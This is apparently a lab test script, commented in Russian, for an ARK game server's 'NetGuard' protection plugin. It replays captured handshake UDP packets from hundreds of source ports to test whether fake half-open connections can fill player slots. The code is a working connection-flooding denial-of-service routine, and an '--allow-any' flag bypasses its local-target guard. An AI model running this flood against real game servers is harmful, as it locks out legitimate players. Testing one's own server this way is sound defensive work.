# -*- coding: utf-8 -*-
"""
ark_lab_deadconn.py — эксперимент «мёртвые подключения вместо игроков».

Гипотеза: если набить сервер полуоткрытыми соединениями, он начнёт считать
их игроками и отпускать «все места заняты» - то есть настоящих игроков
можно будет не пустить.

Что проверяем (наблюдателем, а не моделью):
  1. Счётчики сервера: UNetDriver::ClientConnections (живые соединения) vs
     GameState->PlayerArray (залогиненные игроки) vs ёмкость (AtCapacity).
  2. Реплей перехваченного рукопожатия с N РАЗНЫХ портов источника:
     создаст ли сервер соединения (т.е. доходит ли трафик до UE4-слоя).
  3. Не ломает ли реплей живое соединение настоящего клиента.

Всё против локального стенда (127.0.0.1 / 192.168.8.218).
"""
from __future__ import annotations

import argparse
import os
import re
import socket
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ark_lab_metrics import NetGuardClient, MetricsError  # noqa: E402
from ark_lab_net import guard_target, LabTargetError  # noqa: E402

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass

CAPTURE = r"C:\asmdata\Servers\Server2\ShooterGame\Binaries\Win64\ArkApi\Plugins\NetGuard\NetGuard_capture.log"


def load_capture_packets(path: str, limit: int = 40) -> list[bytes]:
    """Берём первые пакеты перехвата (сырые байты, без заголовка лога)."""
    out: list[bytes] = []
    if not os.path.exists(path):
        return out
    import io
    with io.open(path, encoding="utf-8", errors="replace") as f:
        for m in re.finditer(r"\[pkt conn=\S+ len=\d+\] ([0-9a-f]*)", f.read()):
            try:
                out.append(bytes.fromhex(m.group(1)))
            except ValueError:
                continue
            if len(out) >= limit:
                break
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description="Эксперимент: мёртвые соединения против игроков")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--sources", type=int, default=500, help="сколько портов источника")
    ap.add_argument("--rounds", type=int, default=2, help="сколько раз повторить перехват")
    ap.add_argument("--capture", default=CAPTURE)
    ap.add_argument("--allow-any", action="store_true")
    args = ap.parse_args()

    try:
        guard_target(args.host, args.allow_any)
    except LabTargetError as exc:
        print("[!] %s" % (exc,))
        return 2

    m = NetGuardClient("127.0.0.1", args.metrics_port, timeout=5.0)

    def snap():
        s = m.status()
        return (s.get("liveConnections", 0), s.get("players", 0),
                s.get("atCapacity", 0), s.get("maxPlayers", 0),
                s.get("tps", 0.0), s.get("tickMs", 0.0))

    pkts = load_capture_packets(args.capture, limit=24)
    print("=" * 78)
    print("Мёртвые соединения: %d пакетов перехвата, %d портов источника, %d раундов"
          % (len(pkts), args.sources, args.rounds))
    print("=" * 78)
    if not pkts:
        print("[!] перехват пуст - сначала подключите клиент")
        m.close()
        return 1

    before = snap()
    print("  до    : соединений=%d игроков=%d atCapacity=%d maxPlayers=%d tps=%.1f tick=%.2f"
          % before)

    sent = 0
    for r in range(args.rounds):
        for i in range(args.sources):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.bind(("0.0.0.0", 20000 + (i * 7 + r * 13) % 40000))
                for p in pkts[:6]:
                    s.sendto(p, (args.host, args.game_port))
                    sent += 1
            except OSError:
                pass
            finally:
                s.close()
        time.sleep(1.0)
        cur = snap()
        print("  раунд %d: отправлено %d пакетов | соединений=%d игроков=%d atCapacity=%d tps=%.1f tick=%.2f"
              % (r + 1, sent, cur[0], cur[1], cur[2], cur[4], cur[5]))

    time.sleep(3.0)
    after = snap()
    print("  после : соединений=%d игроков=%d atCapacity=%d maxPlayers=%d tps=%.1f tick=%.2f"
          % after)
    print("\n  ВЫВОД: соединений %d -> %d, игроков %d -> %d, atCapacity %d -> %d"
          % (before[0], after[0], before[1], after[1], before[2], after[2]))
    if after[0] == before[0] and after[1] == before[1]:
        print("  => реплей не создал ни одного соединения: трафик не доходит до UE4-слоя")
        print("     (игоровой порт обслуживает Steam P2P-слой, он отбрасывает невалидные датграммы)")
    m.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
